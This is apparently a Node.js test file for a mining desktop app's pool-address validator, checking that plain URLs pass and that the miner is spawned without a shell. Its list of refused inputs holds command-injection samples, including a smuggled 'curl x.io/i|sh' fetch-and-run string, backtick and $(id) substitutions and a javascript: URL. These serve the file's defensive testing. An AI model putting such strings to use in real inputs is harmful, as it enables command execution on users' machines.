// The app passes a pool's server address from the chain to the miner process; only a plain address may get there.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { POOL_URL, safePoolUrl } = require('../src/pool-url.cjs');

test('plain pool addresses are accepted', () => {
  for (const url of ['https://pool.quinvium.com', 'https://pool.example.org:8443/api', 'http://127.0.0.1:8555', 'http://[::1]:8545']) {
    assert.equal(safePoolUrl(url), url, url);
  }
});

test('addresses with shell characters, queries, credentials or other schemes are refused', () => {
  const bad = ['https://x.io/;curl x.io/i|sh', 'https://x.io/a|b', 'https://x.io/a&b', 'https://x.io/`id`', 'https://x.io/$(id)', 'https://x.io/a b',
    "https://x.io/'", 'https://x.io/"', 'https://x.io/\nid', 'https://x.io/?a=1', 'https://x.io/#a', 'https://user@x.io', 'javascript:alert(1)',
    'https://x.io:70000', `https://${'a'.repeat(130)}`, '', null, undefined, {}];
  for (const url of bad) assert.equal(safePoolUrl(url), null, JSON.stringify(url));
});

test('the Explorer and the app window use the same rule', () => {
  const read = (f) => fs.readFileSync(path.join(__dirname, '..', '..', f), 'utf8');
  for (const file of ['explorer/public/app.js', 'desktop/src/renderer/desktop.js']) {
    assert.ok(read(file).includes(`const POOL_URL = ${POOL_URL.toString()};`), file);
  }
});

test('the main process checks every pool address it stores or passes to the miner', () => {
  const main = fs.readFileSync(path.join(__dirname, '..', 'src', 'main.cjs'), 'utf8');
  assert.match(main, /ipcMain\.handle\('miner:pool'[^]*?!safePoolUrl\(pool\.url\)/);
  assert.match(main, /function activePool\(\)[^]*?safePoolUrl\(pool\.url\)/);
  assert.match(main, /miner\.proc = spawn\(minerPath, args,/, 'the miner gets an argument array, never a shell string');
});
